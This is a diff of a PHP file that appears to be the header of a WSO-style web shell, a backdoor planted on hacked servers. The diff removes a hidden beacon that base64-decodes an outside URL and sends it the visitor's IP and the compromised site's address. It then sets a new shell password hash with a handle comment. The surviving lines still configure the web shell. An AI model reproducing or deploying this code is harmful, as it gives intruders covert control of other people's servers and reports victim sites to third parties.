@@ -1,29 +1,4 @@
-?><?php
-function GetIP(){
-    if(getenv("HTTP_CLIENT_IP")) {
-        $ip = getenv("HTTP_CLIENT_IP");
-    } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
-        $ip = getenv("HTTP_X_FORWARDED_FOR");
-        if (strstr($ip, ',')) {
-            $tmp = explode (',', $ip);
-            $ip = trim($tmp[0]);
-        }
-    } else {
-        $ip = getenv("REMOTE_ADDR");
-    }
-    return $ip;
-}
-$x = base64_decode('aHR0cDovL2J5cjAwdC5jby9sLQ==').GetIP().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
-if(function_exists('curl_init'))
-{
-    $ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
-    if($gitt == false){
-        @$gitt = file_get_contents($x);
-    }
-}elseif(function_exists('file_get_contents')){
-    @$gitt = file_get_contents($x);
-}
-?><?php $auth_pass = "a6d13df8a46cf713e5cda6a6c0d043bf";
+<?php $auth_pass = "6889734623eb82a2de3fd164d4a566cf"; //yuumei
  $color = "#00ff66";
  $default_action = 'FilesMan';
  @define('SELF_PATH', __FILE__);
